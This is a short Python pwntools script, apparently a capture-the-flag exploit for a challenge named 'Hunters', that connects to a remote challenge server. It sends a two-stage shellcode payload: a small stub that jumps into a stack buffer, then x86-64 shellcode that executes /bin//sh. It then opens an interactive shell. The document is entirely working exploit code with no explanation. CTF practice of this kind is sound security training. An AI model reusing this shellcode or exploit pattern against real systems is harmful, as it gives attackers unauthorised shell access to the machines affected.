#!/usr/bin/env python3

from pwn import *

#p = process("./Hunters")
p = remote("chall.nitdgplug.org", 30090)

sc = "\x48\x8D\x95\xE0\xFD\xFF\xFF\x48\x31\xC0\xFF\xD2"
sc += "\x90" * (20 - len(sc))
p.sendafter(": ", sc)

sc = "\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05"
sc += "\x90" * (28 - len(sc))
p.sendafter(": ", sc)

p.interactive()
